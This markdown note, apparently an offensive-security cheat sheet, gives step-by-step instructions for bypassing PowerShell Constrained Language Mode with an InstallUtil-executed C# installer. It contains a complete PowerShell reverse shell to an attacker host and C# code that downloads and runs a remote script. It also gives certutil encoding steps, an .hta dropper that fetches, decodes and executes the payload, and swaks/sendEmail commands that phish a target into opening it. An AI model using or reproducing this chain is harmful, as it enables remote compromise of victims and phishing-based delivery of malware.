# C# for CLM Bypass with PS Script

## IMPORTANT:

There are a few things to note about this code. First, the _System.Configuration.Install_namespace is missing an assembly reference in Visual Studio. We can add this by again right-clicking on References in the Solution Explorer and choosing Add References.... From here, we'll navigate to the Assemblies menu on the left-hand side and scroll down to System.Configuration.Install

## How the Bypass CLM Works: 

The bypass trick is not within the code but rather on the execution where we use C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Tools\Bypass.exe

## Steps

### 1) Create the shell.ps1

In this case it is just a normal reverse (no Meterpreter) shell without bypassing AMSI but you can improve this

    $client = New-Object System.Net.Sockets.TCPClient('[ATTACKER_IP]',[PORT]);$stream =$client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

### 2) Create a new Console App (.NET Framework)

    using System;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;
    using System.Configuration.Install;
    
    namespace Bypass
    {
        class Program
        {
            static void Main(string[] args)
            {
                Console.WriteLine("This is the main method.");
            }
        }
    
        [System.ComponentModel.RunInstaller(true)]
        public class Sample : System.Configuration.Install.Installer
        {
            public override void Uninstall(System.Collections.IDictionary savedState)
            {
                String cmd = "IEX(New-Object Net.WebClient).DownloadString('http://[Attacker_IP]/shell.ps1";
                Runspace rs = RunspaceFactory.CreateRunspace();
                rs.Open();
    
                PowerShell ps = PowerShell.Create();
                ps.Runspace = rs;
    
                ps.AddScript(cmd);
    
                ps.Invoke();
    
                rs.Close();
            }
        }
    }

### 3) Add the missing references

Right-clicking on References in the Solution Explorer > Choosing Add References > Add System.Configuration.Install

Also add by browsing: C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll

### 4) Compile the project

    dotnet build

Release & Any CPU (also x64 could work)

### 5) Encode the program

    certutil.exe -encode .\Bypass\bin\Release\Bypass.exe enc5.txt

### 6) Create .hta file

    <html>
    <head>
    <script language="JScript">
    var shell = new ActiveXObject("WScript.Shell");
    var res = shell.Run("powershell iwr -uri http://[ATTACKER_IP]/enc5.txt -outfile C:\\Windows\\Tasks\\enc7.txt; powershell certutil -decode C:\\Windows\\Tasks\\enc7.txt C:\\Windows\\Tasks\\gimme3.exe;C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile=/LogToConsole=false /U C:\\Windows\\Tasks\\gimme3.exe");
    </script>
    </head>
    <body>
    
    <script language="JScript">
    self.close();
    </script>
    
    </body>
    </html>

### 7) Find a way to deliver the .hta file to the user, can be also sending an email

    swaks --body 'Please click here http://[ATTACKER_IP]/[MAL_FILE].hta' --add-header "MIME-Version: 1.0" --add-header "Content-Type: text/html" --header "Subject: Issues with mail" -t [TARGET_ADDRESS] -f attacker@test.com --server [SMTP_SERVER_IP]
    
    sendEmail -s [SMTP_SERVER_IP] -t [TARGET_ADDRESS] -f attacker@test.com -u "Subject: Issues with mail" -o message-content-type=html -m "Please click here http://[ATTACKER_IP]/[MAL_FILE].hta" -a [MAL_FILE].hta
